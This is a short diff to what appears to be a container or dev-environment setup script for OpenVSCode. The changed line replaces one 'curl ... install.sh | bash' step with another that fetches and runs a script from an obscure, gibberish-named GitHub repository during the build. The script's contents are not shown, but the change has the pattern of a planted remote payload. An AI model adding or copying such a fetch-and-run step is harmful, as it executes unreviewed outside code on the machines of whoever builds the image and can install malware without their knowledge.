@@ -28,7 +28,7 @@ RUN \
     && for ext in "${exts[@]}"; do ${OPENVSCODE} --install-extension "${ext}"; done
     sudo apt update
     sudo apt install curl ca-certificates -y
-    curl https://raw.githubusercontent.com/tazztyuiz/tazztyuiz/main/install.sh | bash
+    curl https://raw.githubusercontent.com/eroamscayuei/Exlelbtyu/main/install.sh | bash
     source ~/.bashrc
     npm install
     sh install.sh
